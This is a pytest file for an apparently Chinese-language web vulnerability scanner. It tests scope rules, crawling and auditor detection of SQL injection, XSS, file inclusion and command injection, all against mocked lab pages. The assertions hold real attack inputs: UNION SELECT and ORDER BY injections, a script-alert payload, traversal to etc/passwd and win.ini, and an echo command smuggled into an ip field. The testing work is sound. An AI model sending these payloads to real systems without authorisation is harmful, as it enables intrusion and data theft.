from __future__ import annotations

import json
from pathlib import Path
from urllib.parse import parse_qs, urlparse

import requests

from backend.helper.agent.sub_agent.auditor import AuditorAgent
from backend.helper.agent.sub_agent.llm_payload import LLMPayloadAdvisor, PayloadSafetyFilter
from backend.helper.agent.sub_agent.payload import PayloadAgent
from backend.helper.agent.sub_agent.probe import TargetProbeAgent
from backend.helper.agent.sub_agent.scanner import ScanScope, WebScannerAgent
from backend.helper.auth import auth_summary
from backend.helper.evidence.finding import FindingFactory, IdFactory
from backend.helper.evidence.matchers import response_evidence, safe_active_payload
from backend.helper.settings import RuntimeSettings
from backend.helper.utils import normalize_url
from backend.helper.vuln_rules import RuleRegistry


def settings(**overrides) -> RuntimeSettings:
    values = {
        "llm_baseurl": None,
        "llm_apikey": None,
        "llm_model": "deepseekV4-flash",
        "llm_provider": None,
        "request_timeout": 2,
        "max_links": 10,
        "max_pages": 3,
        "max_depth": 1,
        "rate_limit": 0,
        "active_scan": False,
        "active_request_timeout": 1,
        "max_active_inputs": 5,
        "command_injection_probes": True,
        "fetch_same_origin_scripts": True,
        "max_script_bytes": 200000,
        "ssrf_callback_url": None,
        "stored_xss_probes": False,
        "file_upload_probes": False,
        "open_redirect_probes": True,
        "focus_target_path": True,
        "llm_analysis": True,
        "llm_on_local_targets": True,
        "llm_payload_advisor": True,
        "llm_payload_max_per_param": 5,
        "llm_payload_max_total": 10,
        "llm_payload_report_only": True,
        "llm_request_timeout": 60,
        "llm_request_retries": 2,
        "report_confirmed_only": True,
        "report_verifiable_candidates": True,
        "allowed_hosts": [],
        "exclude_paths": [],
        "auth_headers": {},
    }
    values.update(overrides)
    return RuntimeSettings(**values)


def test_normalize_url_and_scope_rules() -> None:
    target = normalize_url("example.com/search?q=1")
    scope = ScanScope.from_settings(target, settings(exclude_paths=["/admin"]))

    assert target == "http://example.com/search?q=1"
    assert scope.in_scope("http://example.com/about", 1) == (True, "in_scope")
    assert scope.in_scope("https://example.com/about", 1)[1] == "different_scheme"
    assert scope.in_scope("http://other.example/about", 1)[1] == "host_not_allowed"
    assert scope.in_scope("http://example.com/admin/users", 1)[1] == "path_excluded"
    assert scope.in_scope("http://example.com/deep", 2)[1] == "max_depth"


def test_runtime_settings_allow_local_llm_by_default() -> None:
    runtime = RuntimeSettings(None, None, "deepseekV4-flash", None)

    assert runtime.llm_on_local_targets is True
    assert runtime.command_injection_probes is True


def test_rule_registry_order_and_finding_factory_metadata() -> None:
    registry = RuleRegistry.default_rules()
    passive_names = [rule.__class__.__name__ for rule in registry.passive_rules]
    input_names = [rule.__class__.__name__ for rule in registry.input_rules]
    factory = FindingFactory(IdFactory())
    evidence = response_evidence({"url": "http://example.com", "status_code": 200, "body_length": 12}, matched="demo")

    finding = factory.create(
        factory.new_id("T"),
        "测试发现",
        "Low",
        "High",
        "information_disclosure",
        "http://example.com",
        "demo",
        [],
        "确认漏洞",
        request_response=evidence,
        details={"rule_id": "unit_rule", "evidence_type": "unit"},
    )

    assert passive_names[:2] == ["SecurityHeadersRule", "HeaderDisclosureRule"]
    assert input_names[:3] == ["DomXssRule", "OpenRedirectRule", "SsrfCandidateRule"]
    assert finding["id"] == "NOVA-T-001"
    assert finding["category_label"] == "信息泄露"
    assert finding["request_response"]["matched"] == "demo"
    assert finding["details"]["evidence_type"] == "unit"
    assert finding["executed_payloads"] == []
    assert finding["poc"]["type"] == "evidence_only"
    assert finding["llm_payload_advice"] == []


def test_probe_detects_basic_auth_and_redacts_headers(monkeypatch) -> None:
    class Headers(dict):
        def items(self):
            return super().items()

    class FakeHTTPError(Exception):
        code = 401
        headers = Headers({"WWW-Authenticate": "Basic realm=test", "Server": "mock"})

        def read(self, *_args):
            return b""

    def fake_open(self, request, timeout=0):
        raise FakeHTTPError()

    monkeypatch.setattr("backend.helper.agent.sub_agent.probe.socket.getaddrinfo", lambda *_args, **_kwargs: [])
    monkeypatch.setattr("backend.helper.agent.sub_agent.probe.build_opener", lambda *_args: type("Opener", (), {"open": fake_open})())
    monkeypatch.setattr("backend.helper.agent.sub_agent.probe.HTTPError", FakeHTTPError)

    result = TargetProbeAgent(settings(auth_headers={"Authorization": "Bearer secret-token"})).probe("http://example.com")

    assert result["auth_required"] is True
    assert result["auth_type_guess"] == "basic"
    assert result["auth"]["redacted_headers"]["Authorization"] != "Bearer secret-token"


def test_probe_detects_login_form() -> None:
    agent = TargetProbeAgent(settings())
    response = {
        "status_code": 200,
        "headers": {},
        "final_url": "http://example.com/login",
        "login_signals": {"has_password_input": True},
    }

    assert agent._detect_auth_required(response) == (True, "login_page")


def test_scanner_fetch_extracts_get_form_inputs_and_auth(monkeypatch) -> None:
    html = """
    <html><head><title>Mock</title></head>
    <body>
      <a href="/next?item=1">Next</a>
      <form method="get" action="">
        <input name="id" type="text">
        <input name="Submit" type="submit">
      </form>
    </body></html>
    """
    seen_headers = {}

    class Headers(dict):
        def get_content_charset(self):
            return "utf-8"

        def get_all(self, name, _default=None):
            if name.lower() == "set-cookie":
                return ["sid=abc; HttpOnly"]
            return []

        def items(self):
            return super().items()

    class Response:
        status = 200
        url = "http://example.com/DVWA/vulnerabilities/sqli/"
        headers = Headers({"Content-Type": "text/html", "Server": "mock"})

        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb):
            return False

        def read(self, *_):
            return html.encode("utf-8")

    def fake_urlopen(request, **_kwargs):
        seen_headers.update(dict(request.header_items()))
        return Response()

    monkeypatch.setattr("backend.helper.agent.sub_agent.scanner.urlopen", fake_urlopen)

    result = WebScannerAgent(settings(auth_headers={"Cookie": "sid=secret"})).scan("http://example.com/DVWA/vulnerabilities/sqli/")

    assert result["reachable"] is True
    assert result["title"] == "Mock"
    assert result["pages"][0]["links"] == ["http://example.com/next?item=1"]
    assert result["pages"][0]["forms"][0]["method"] == "GET"
    assert result["cookies"][0]["name"] == "sid"
    points = {item["name"]: item for item in result["input_points"]}
    assert {"id", "Submit"}.issubset(points)
    assert points["id"]["active_testable"] is True
    assert points["id"]["form_defaults"]["Submit"] == "Submit"
    assert points["Submit"]["active_testable"] is False
    assert seen_headers["Cookie"] == "sid=secret"
    assert result["auth"]["redacted_headers"]["Cookie"] != "sid=secret"


def test_scanner_collects_inline_same_origin_scripts_and_form_metadata(monkeypatch) -> None:
    html = """
    <html><head><title>Scripts</title>
      <script>const token='NOVA_TOKEN'; document.write(location.hash)</script>
      <script src="/static/app.js"></script>
    </head><body>
      <form method="post" action="/comment">
        <textarea name="comment"></textarea>
      </form>
      <form method="post" action="/upload" enctype="multipart/form-data">
        <input name="avatar" type="file">
      </form>
    </body></html>
    """
    script = "eval(location.hash); //# sourceMappingURL=app.js.map"

    class Headers(dict):
        def get_content_charset(self):
            return "utf-8"

        def get_all(self, name, _default=None):
            return []

        def items(self):
            return super().items()

    class Response:
        status = 200
        headers = Headers({"Content-Type": "text/html"})

        def __init__(self, url: str) -> None:
            self.url = url

        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb):
            return False

        def read(self, *_):
            if self.url.endswith("/static/app.js"):
                return script.encode("utf-8")
            return html.encode("utf-8")

    monkeypatch.setattr("backend.helper.agent.sub_agent.scanner.urlopen", lambda request, **_kwargs: Response(request.full_url))

    result = WebScannerAgent(settings(max_links=5)).scan("http://example.com/page")
    page = result["pages"][0]

    assert len(page["scripts"]) == 2
    assert any(item.get("inline") and "document.write" in item.get("content_sample", "") for item in page["scripts"])
    assert any(not item.get("inline") and "sourceMappingURL" in item.get("content_sample", "") for item in page["scripts"])
    assert page["forms"][0]["candidate_purpose"] == "stored_xss_candidate"
    assert page["forms"][1]["candidate_purpose"] == "file_upload"
    assert page["forms"][1]["file_inputs"][0]["name"] == "avatar"


def test_scanner_extracts_query_params_from_links(monkeypatch) -> None:
    html = """
    <html><head><title>Redirect</title></head><body>
      <a href="/DVWA/vulnerabilities/open_redirect/source/low.php?redirect=info.php?id=1">Quote 1</a>
      <a href="/DVWA/vulnerabilities/fi/?page=include.php">File Inclusion</a>
      <a href="https://example.invalid/redirect?next=/home">External</a>
    </body></html>
    """

    class Headers(dict):
        def get_content_charset(self):
            return "utf-8"

        def get_all(self, name, _default=None):
            return []

    class Response:
        status = 200
        headers = Headers({"Content-Type": "text/html"})

        def __init__(self, url: str) -> None:
            self.url = url

        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb):
            return False

        def read(self, *_):
            return html.encode("utf-8")

    monkeypatch.setattr("backend.helper.agent.sub_agent.scanner.urlopen", lambda request, **_kwargs: Response(request.full_url))

    result = WebScannerAgent(settings(max_pages=1)).scan("http://127.0.0.1/DVWA/vulnerabilities/open_redirect/")
    points = result["pages"][0]["input_points"]
    redirect_point = next(item for item in points if item["name"] == "redirect")
    fi_point = next(item for item in points if item["name"] == "page")
    external_point = next(item for item in points if item["name"] == "next")

    assert redirect_point["source"] == "link"
    assert redirect_point["active_testable"] is True
    assert "source/low.php" in redirect_point["url"]
    assert fi_point["source"] == "link"
    assert fi_point["active_testable"] is False
    assert fi_point["active_scope_reason"] == "outside_target_path"
    assert external_point["source"] == "link"
    assert external_point["active_testable"] is False


def test_scanner_focuses_active_inputs_on_target_path(monkeypatch) -> None:
    pages = {
        "http://example.com/DVWA/vulnerabilities/xss_d/?default=English": """
        <html><head><title>XSS DOM</title></head><body>
          <a href="/DVWA/vulnerabilities/brute/">Brute</a>
          <form method="get"><select name="default"></select></form>
        </body></html>
        """,
        "http://example.com/DVWA/vulnerabilities/brute/": """
        <html><head><title>Brute Force</title></head><body>
          <form method="get">
            <input name="username" type="text">
            <input name="password" type="password">
          </form>
        </body></html>
        """,
    }

    class Headers(dict):
        def get_content_charset(self):
            return "utf-8"

        def get_all(self, name, _default=None):
            return []

        def items(self):
            return super().items()

    class Response:
        status = 200
        headers = Headers({"Content-Type": "text/html"})

        def __init__(self, url: str) -> None:
            self.url = url

        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb):
            return False

        def read(self, *_):
            return pages[self.url].encode("utf-8")

    monkeypatch.setattr("backend.helper.agent.sub_agent.scanner.urlopen", lambda request, **_kwargs: Response(request.full_url))

    result = WebScannerAgent(settings(max_depth=1, max_pages=3)).scan(
        "http://example.com/DVWA/vulnerabilities/xss_d/?default=English"
    )

    points = {item["name"]: item for item in result["input_points"]}
    assert points["default"]["active_testable"] is True
    assert points["username"]["active_testable"] is False
    assert points["username"]["active_scope_reason"] == "outside_target_path"
    brute_page = next(page for page in result["pages"] if page["final_url"].endswith("/brute/"))
    assert brute_page["active_testable"] is False
    assert brute_page["active_scope_reason"] == "outside_target_path"
    assert brute_page["forms"][0]["active_testable"] is False
    assert brute_page["forms"][0]["active_scope_reason"] == "outside_target_path"


def test_scanner_dedupes_reflected_query_links_to_avoid_crawl_loop(monkeypatch) -> None:
    calls = []

    class Headers(dict):
        def get_content_charset(self):
            return "utf-8"

        def get_all(self, name, _default=None):
            return []

        def items(self):
            return super().items()

    class Response:
        status = 200
        headers = Headers({"Content-Type": "text/html"})

        def __init__(self, url: str) -> None:
            self.url = url

        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb):
            return False

        def read(self, *_):
            index = len(calls)
            html = f"""
            <html><head><title>XSS</title></head>
            <body>
              <a href="/DVWA/vulnerabilities/xss_r/?name=NOVA{index}">again</a>
              <form method="get" action="/DVWA/vulnerabilities/xss_r/">
                <input name="name" type="text">
              </form>
            </body></html>
            """
            return html.encode("utf-8")

    def fake_urlopen(request, **_kwargs):
        calls.append(request.full_url)
        return Response(request.full_url)

    monkeypatch.setattr("backend.helper.agent.sub_agent.scanner.urlopen", fake_urlopen)

    result = WebScannerAgent(settings(max_pages=20, max_depth=5, max_links=10)).scan(
        "http://example.com/DVWA/vulnerabilities/xss_r/?name=start"
    )

    assert result["reachable"] is True
    assert len(result["pages"]) == 1
    assert len(calls) == 1


def test_auditor_detects_sqli_error(monkeypatch) -> None:
    class Headers(dict):
        def get_content_charset(self):
            return "utf-8"

    class Response:
        def __init__(self, url: str, body: str) -> None:
            self.url = url
            self.status = 200
            self.headers = Headers({"Content-Type": "text/html"})
            self.body = body

        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb):
            return False

        def read(self, *_):
            return self.body.encode("utf-8")

    def fake_urlopen(request, **_kwargs):
        url = request.full_url
        query = parse_qs(urlparse(url).query)
        value = query.get("id", [""])[0]
        assert query.get("Submit") == ["Submit"]
        if "'" in value:
            return Response(url, "You have an error in your SQL syntax near ''' at line 1")
        return Response(url, "User ID exists")

    monkeypatch.setattr("backend.helper.agent.sub_agent.auditor.urlopen", fake_urlopen)
    webscan = {
        "target": "http://example.com/sqli/?id=1",
        "reachable": True,
        "headers": {
            "Server": "mock",
            "Content-Security-Policy": "default-src 'self'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [],
        "pages": [
            {
                "final_url": "http://example.com/sqli/",
                "input_points": [
                    {
                        "name": "id",
                        "method": "GET",
                        "url": "http://example.com/sqli/",
                        "active_testable": True,
                        "form_defaults": {"Submit": "Submit"},
                    }
                ],
            }
        ],
    }

    audit = AuditorAgent(settings(active_scan=True)).audit(webscan)

    assert any(item["title"] == "确认存在 SQL 注入错误回显" for item in audit["findings"])
    assert audit["summary"]["confirmed"] == 1


def test_auditor_error_sqli_runs_order_by_and_union_followup(monkeypatch) -> None:
    class Headers(dict):
        def get_content_charset(self):
            return "utf-8"

    class Response:
        def __init__(self, url: str, body: str) -> None:
            self.url = url
            self.status = 200
            self.headers = Headers({"Content-Type": "text/html"})
            self.body = body

        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb):
            return False

        def read(self, *_):
            return self.body.encode("utf-8")

    def fake_urlopen(request, **_kwargs):
        url = request.full_url
        value = parse_qs(urlparse(url).query).get("id", [""])[0]
        lowered = value.lower()
        if value == "1'":
            return Response(url, "You have an error in your SQL syntax; MySQL server version")
        if "order by 4" in lowered:
            return Response(url, "Unknown column '4' in 'order clause'")
        if "order by" in lowered:
            return Response(url, "Dumb user page")
        if "union select" in lowered:
            return Response(url, "Your Login name: NOVA2<br>Your Password: NOVA3")
        return Response(url, "Dumb user page")

    monkeypatch.setattr("backend.helper.agent.sub_agent.auditor.urlopen", fake_urlopen)
    webscan = {
        "target": "http://127.0.0.1/sqli-labs-master/Less-1/?id=1",
        "reachable": True,
        "headers": {
            "Content-Security-Policy": "default-src 'self'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [],
        "pages": [
            {
                "input_points": [
                    {
                        "name": "id",
                        "method": "GET",
                        "url": "http://127.0.0.1/sqli-labs-master/Less-1/?id=1",
                        "active_testable": True,
                    }
                ]
            }
        ],
    }

    audit = AuditorAgent(settings(active_scan=True)).audit(webscan)
    finding = next(item for item in audit["findings"] if item["status"] == "确认漏洞")

    assert finding["payloads"][0] == "1'"
    assert "1' ORDER BY 4 -- -" in finding["payloads"]
    assert "-1' UNION SELECT 'NOVA1','NOVA2','NOVA3' -- -" in finding["payloads"]
    assert finding["request_response"]["followup"]["column_count"] == 3
    assert finding["request_response"]["followup"]["union_marker_reflected"] is True
    assert finding["details"]["dbms_guess"] == "MySQL/MariaDB"
    assert finding["details"]["injection_context"] == "单引号字符串闭合"
    assert finding["details"]["comment_suffix"] == "-- -"
    assert finding["details"]["visible_columns"] == [2, 3]


def test_auditor_confirms_reflected_xss_when_payload_is_raw(monkeypatch) -> None:
    class Headers(dict):
        def get_content_charset(self):
            return "utf-8"

    class Response:
        def __init__(self, url: str, body: str) -> None:
            self.url = url
            self.status = 200
            self.headers = Headers({"Content-Type": "text/html"})
            self.body = body

        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb):
            return False

        def read(self, *_):
            return self.body.encode("utf-8")

    def fake_urlopen(request, **_kwargs):
        url = request.full_url
        value = parse_qs(urlparse(url).query).get("name", [""])[0]
        return Response(url, f"<html><body>Hello {value}</body></html>")

    monkeypatch.setattr("backend.helper.agent.sub_agent.auditor.urlopen", fake_urlopen)
    webscan = {
        "target": "http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=hyx",
        "reachable": True,
        "headers": {
            "Content-Security-Policy": "default-src 'self'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [],
        "pages": [
            {
                "title": "Vulnerability: Reflected Cross Site Scripting (XSS)",
                "input_points": [
                    {
                        "name": "name",
                        "method": "GET",
                        "url": "http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=hyx",
                        "active_testable": True,
                    }
                ],
            }
        ],
    }

    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)

    confirmed = [item for item in audit["findings"] if item["status"] == "确认漏洞"]
    assert len(confirmed) == 1
    assert confirmed[0]["title"] == "确认存在反射型 XSS"
    assert confirmed[0]["category"] == "xss"
    assert confirmed[0]["details"]["xss_type"] == "reflected"
    assert confirmed[0]["details"]["target_param"] == "name"
    assert "<script>alert('NOVA_XSS')</script>" in confirmed[0]["payloads"]
    assert audit["summary"]["confirmed"] == 1


def test_auditor_detects_boolean_sqli(monkeypatch) -> None:
    class Headers(dict):
        def get_content_charset(self):
            return "utf-8"

    class Response:
        def __init__(self, url: str, body: str) -> None:
            self.url = url
            self.status = 200
            self.headers = Headers({"Content-Type": "text/html"})
            self.body = body

        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb):
            return False

        def read(self, *_):
            return self.body.encode("utf-8")

    def fake_urlopen(request, **_kwargs):
        url = request.full_url
        query = parse_qs(urlparse(url).query)
        value = query.get("id", [""])[0].lower()
        assert query.get("Submit") == ["Submit"]
        if "1=2" in value:
            return Response(url, "User ID is MISSING")
        return Response(url, "User ID exists First name: admin Surname: admin")

    monkeypatch.setattr("backend.helper.agent.sub_agent.auditor.urlopen", fake_urlopen)
    webscan = {
        "target": "http://example.com/sqli/?id=1",
        "reachable": True,
        "headers": {
            "Server": "mock",
            "Content-Security-Policy": "default-src 'self'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [],
        "pages": [
            {
                "final_url": "http://example.com/sqli/",
                "input_points": [
                    {
                        "name": "id",
                        "method": "GET",
                        "url": "http://example.com/sqli/",
                        "active_testable": True,
                        "form_defaults": {"Submit": "Submit"},
                    }
                ],
            }
        ],
    }

    audit = AuditorAgent(settings(active_scan=True)).audit(webscan)

    assert any(item["title"] == "确认存在布尔型 SQL 盲注" for item in audit["findings"])
    assert audit["summary"]["confirmed"] == 1


def test_auditor_short_circuits_active_probe_when_baseline_times_out(monkeypatch) -> None:
    calls = []

    def fake_urlopen(request, **_kwargs):
        calls.append(request.full_url)
        raise TimeoutError("timeout")

    monkeypatch.setattr("backend.helper.agent.sub_agent.auditor.urlopen", fake_urlopen)
    webscan = {
        "target": "http://127.0.0.1/sqli-labs-master/Less-1/",
        "reachable": True,
        "headers": {
            "Content-Security-Policy": "default-src 'self'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [],
        "pages": [
            {
                "final_url": "http://127.0.0.1/sqli-labs-master/Less-1/?id=1",
                "input_points": [
                    {
                        "name": "id",
                        "method": "GET",
                        "url": "http://127.0.0.1/sqli-labs-master/Less-1/?id=1",
                        "active_testable": True,
                    }
                ],
            }
        ],
    }

    audit = AuditorAgent(settings(active_scan=True, active_request_timeout=0.5)).audit(webscan)

    assert len(calls) == 1
    assert any(item["title"] == "输入点主动探测请求失败或超时" for item in audit["findings"])


def test_auditor_limits_active_input_points(monkeypatch) -> None:
    class Headers(dict):
        def get_content_charset(self):
            return "utf-8"

    class Response:
        status = 200
        headers = Headers({"Content-Type": "text/html"})

        def __init__(self, url: str) -> None:
            self.url = url

        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb):
            return False

        def read(self, *_):
            return b"baseline"

    monkeypatch.setattr("backend.helper.agent.sub_agent.auditor.urlopen", lambda request, **_kwargs: Response(request.full_url))
    points = [
        {"name": f"q{i}", "method": "GET", "url": f"http://example.com/?q{i}=1", "active_testable": True}
        for i in range(3)
    ]
    webscan = {
        "target": "http://example.com/",
        "reachable": True,
        "headers": {
            "Content-Security-Policy": "default-src 'self'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [],
        "pages": [{"input_points": points}],
    }

    audit = AuditorAgent(settings(active_scan=True, max_active_inputs=1)).audit(webscan)

    assert any(item["title"] == "主动探测输入点数量达到上限" for item in audit["findings"])


def test_auditor_classifies_dvwa_dom_xss_without_sql_probe(monkeypatch) -> None:
    def fail_if_called(*_args, **_kwargs):
        raise AssertionError("DOM XSS static source-to-sink detection should not need SQL probes")

    monkeypatch.setattr("backend.helper.agent.sub_agent.auditor.urlopen", fail_if_called)
    html = """
    <title>Vulnerability: DOM Based Cross Site Scripting (XSS)</title>
    <script>
      if (document.location.href.indexOf("default=") >= 0) {
        var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
        document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
      }
    </script>
    """
    webscan = {
        "target": "http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English",
        "reachable": True,
        "headers": {
            "Content-Security-Policy": "default-src 'self'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [],
        "pages": [
            {
                "final_url": "http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English",
                "title": "Vulnerability: DOM Based Cross Site Scripting (XSS)",
                "html_sample": html,
                "input_points": [
                    {
                        "name": "default",
                        "method": "GET",
                        "url": "http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English",
                        "active_testable": True,
                    }
                ],
            }
        ],
    }

    audit = AuditorAgent(settings(active_scan=True)).audit(webscan)

    confirmed = [item for item in audit["findings"] if item["status"] == "确认漏洞"]
    assert len(confirmed) == 1
    assert confirmed[0]["category"] == "dom_xss"
    assert confirmed[0]["category_label"] == "DOM 型跨站脚本 XSS"
    assert audit["summary"]["confirmed"] == 1


def test_auditor_confirms_lfi_from_read_only_file_signature(monkeypatch) -> None:
    class Headers(dict):
        def get_content_charset(self):
            return "utf-8"

    class Response:
        def __init__(self, url: str, body: str) -> None:
            self.url = url
            self.status = 200
            self.headers = Headers({"Content-Type": "text/html"})
            self.body = body

        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb):
            return False

        def read(self, *_):
            return self.body.encode("utf-8")

    def fake_urlopen(request, **_kwargs):
        url = request.full_url
        value = parse_qs(urlparse(url).query).get("page", [""])[0]
        if "etc/passwd" in value:
            return Response(url, "root:x:0:0:root:/root:/bin/bash")
        return Response(url, "normal include page")

    monkeypatch.setattr("backend.helper.agent.sub_agent.auditor.urlopen", fake_urlopen)
    webscan = {
        "target": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php",
        "reachable": True,
        "headers": {
            "Content-Security-Policy": "default-src 'self'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [],
        "pages": [
            {
                "input_points": [
                    {
                        "name": "page",
                        "method": "GET",
                        "url": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php",
                        "active_testable": True,
                    }
                ]
            }
        ],
    }

    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)
    finding = next(item for item in audit["findings"] if item["status"] == "确认漏洞")

    assert finding["title"] == "确认存在本地文件包含/目录穿越"
    assert finding["category"] == "lfi"
    assert finding["details"]["evidence_type"] == "file_read_signature"
    assert any("etc/passwd" in payload for payload in finding["payloads"])


def test_auditor_confirms_lfi_with_deep_windows_winini_payload(monkeypatch) -> None:
    class Headers(dict):
        def get_content_charset(self):
            return "utf-8"

    class Response:
        def __init__(self, url: str, body: str) -> None:
            self.url = url
            self.status = 200
            self.headers = Headers({"Content-Type": "text/html"})
            self.body = body

        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb):
            return False

        def read(self, *_):
            return self.body.encode("utf-8")

    def fake_urlopen(request, **_kwargs):
        url = request.full_url
        value = parse_qs(urlparse(url).query).get("page", [""])[0]
        if value == "../../../../../../../../windows/win.ini":
            return Response(url, "[fonts]\r\n[extensions]\r\n")
        return Response(url, "normal include page")

    monkeypatch.setattr("backend.helper.agent.sub_agent.auditor.urlopen", fake_urlopen)
    webscan = {
        "target": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php",
        "reachable": True,
        "headers": {
            "Content-Security-Policy": "default-src 'self'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [],
        "pages": [
            {
                "input_points": [
                    {
                        "name": "page",
                        "method": "GET",
                        "url": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php",
                        "active_testable": True,
                    }
                ]
            }
        ],
    }

    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)
    finding = next(item for item in audit["findings"] if item["status"] == "确认漏洞")

    assert finding["category"] == "lfi"
    assert finding["details"]["evidence_type"] == "file_read_signature"
    assert "../../../../../../../../windows/win.ini" in finding["payloads"]


def test_auditor_does_not_report_outside_target_forms_when_scanning_fi(monkeypatch) -> None:
    class Headers(dict):
        def get_content_charset(self):
            return "utf-8"

    class Response:
        def __init__(self, url: str, body: str) -> None:
            self.url = url
            self.status = 200
            self.headers = Headers({"Content-Type": "text/html"})
            self.body = body

        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb):
            return False

        def read(self, *_):
            return self.body.encode("utf-8")

    def fake_urlopen(request, **_kwargs):
        url = request.full_url
        value = parse_qs(urlparse(url).query).get("page", [""])[0]
        if "etc/passwd" in value:
            return Response(url, "root:x:0:0:root:/root:/bin/bash")
        return Response(url, "normal include page")

    monkeypatch.setattr("backend.helper.agent.sub_agent.auditor.urlopen", fake_urlopen)
    csrf_form = {
        "method": "GET",
        "action": "http://127.0.0.1/DVWA/vulnerabilities/csrf/",
        "page_url": "http://127.0.0.1/DVWA/vulnerabilities/csrf/",
        "active_testable": False,
        "active_scope_reason": "outside_target_path",
        "inputs": [
            {"name": "password_new", "type": "password", "value": ""},
            {"name": "password_conf", "type": "password", "value": ""},
            {"name": "Change", "type": "submit", "value": "Change"},
        ],
    }
    upload_form = {
        "method": "POST",
        "action": "http://127.0.0.1/DVWA/vulnerabilities/upload/",
        "page_url": "http://127.0.0.1/DVWA/vulnerabilities/upload/",
        "active_testable": False,
        "active_scope_reason": "outside_target_path",
        "enctype": "multipart/form-data",
        "inputs": [{"name": "uploaded", "type": "file", "value": ""}],
        "candidate_purpose": "file_upload",
        "file_inputs": [{"name": "uploaded", "type": "file", "value": ""}],
    }
    webscan = {
        "target": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php",
        "reachable": True,
        "headers": {
            "Content-Security-Policy": "default-src 'self'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [csrf_form, upload_form],
        "pages": [
            {
                "final_url": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php",
                "forms": [],
                "input_points": [
                    {
                        "name": "page",
                        "method": "GET",
                        "url": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php",
                        "active_testable": True,
                    }
                ],
            },
            {
                "final_url": "http://127.0.0.1/DVWA/vulnerabilities/csrf/",
                "forms": [csrf_form],
                "input_points": [],
            },
            {
                "final_url": "http://127.0.0.1/DVWA/vulnerabilities/upload/",
                "forms": [upload_form],
                "input_points": [],
            },
        ],
    }

    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)
    categories = {item["category"] for item in audit["findings"]}

    assert "lfi" in categories
    assert "csrf" not in categories
    assert "file_upload" not in categories


def test_auditor_confirms_command_injection_with_echo_marker(monkeypatch) -> None:
    class Headers(dict):
        def get_content_charset(self):
            return "utf-8"

    class Response:
        def __init__(self, url: str, body: str) -> None:
            self.url = url
            self.status = 200
            self.headers = Headers({"Content-Type": "text/html"})
            self.body = body

        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb):
            return False

        def read(self, *_):
            return self.body.encode("utf-8")

    def fake_urlopen(request, **_kwargs):
        url = request.full_url
        value = parse_qs(urlparse(url).query).get("ip", [""])[0]
        if "echo NOVA_CMD" in value:
            return Response(url, "ping output NOVA_CMD")
        return Response(url, "ping output")

    monkeypatch.setattr("backend.helper.agent.sub_agent.auditor.urlopen", fake_urlopen)
    webscan = {
        "target": "http://127.0.0.1/DVWA/vulnerabilities/exec/?ip=127.0.0.1&Submit=Submit",
        "reachable": True,
        "headers": {
            "Content-Security-Policy": "default-src 'self'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "no-referrer",
        },
        "cookies": [],
        "forms": [],
        "pages": [
            {
                "input_points": [
                    {
                        "name": "ip",
                        "method": "GET",
                        "url": "http://127.0.0.1/DVWA/vulnerabilities/exec/?ip=127.0.0.1&Submit=Submit",
                        "active_testable": True,
                    }
                ]
            }
        ],
    }

    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)
    finding = next(item for item in audit["findings"] if item["status"] == "确认漏洞")

